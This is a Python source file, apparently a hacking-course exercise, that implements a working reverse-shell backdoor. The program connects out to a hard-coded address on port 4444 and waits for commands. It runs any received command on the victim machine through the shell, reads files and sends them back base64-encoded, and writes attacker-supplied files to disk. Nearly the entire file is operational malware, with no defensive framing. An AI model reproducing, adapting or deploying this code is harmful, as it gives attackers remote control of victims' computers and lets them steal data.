import socket
import subprocess
import json
import os
import base64


class Backdoor:
    def __init__(self, ip, port) -> None:
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))


    def bytes_to_str(self, obj):
        if isinstance(obj, bytes):
            return obj.decode('utf-8')
        raise TypeError(f"Object of type {type(obj)} is not JSON serializable")


    def reliable_send(self, data):
        json_data = json.dumps(data, default=self.bytes_to_str)
        # json_data = json.dumps(data).decode()
        self.connection.send(json_data.encode()) # verified


    def reliable_receive(self):
        json_data = b"" # verified
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue


    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)
    

    def change_working_directory(self, path):
        os.chdir(path)
        print(f"[+] Changing working directory to '{path}'")
        return os.getcwd()


    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())


    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))


    def run(self):
        while True:
            command = self.reliable_receive()
            split_command = command.split(" ")
            print(split_command[0:1])
            if split_command[0] == "exit":
            # if command == "exit":
                self.connection.close()
                print("[-] Session terminated remotely")
                exit()
            # elif command.startswith("cd") and len(command) > 2:
            #     command_result = self.change_working_directory(command[3:])
            elif split_command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory(split_command[1])
            # elif command.startswith("download"):
            #     command_result = self.read_file(command[9:])
            elif split_command[0] == "download":
                command_result = self.read_file(split_command[1])
            elif split_command[0] == "upload":
                print(split_command[0:1])
                command_result = self.write_file(split_command[1], split_command[2])
            else:
                command_result = self.execute_system_command(command).decode() # verified
            self.reliable_send(command_result)


# try:
my_backdoor = Backdoor("10.0.2.15", 4444)
my_backdoor.run()
# except KeyboardInterrupt:
#     print("[-] Detected CTRL+C ... terminating app, please wait.")
# except OSError as e:
#     if "Connection refused" in str(e):
#         print("[-] Connection request refused, no one is listening") # remove in prod
#     else:
#         print(f"[-] An unexpected OS Error occurred: {e}")
# except subprocess.CalledProcessError:
#     print("[-] Connection reset or invalid command ")

print("Goodbye!")
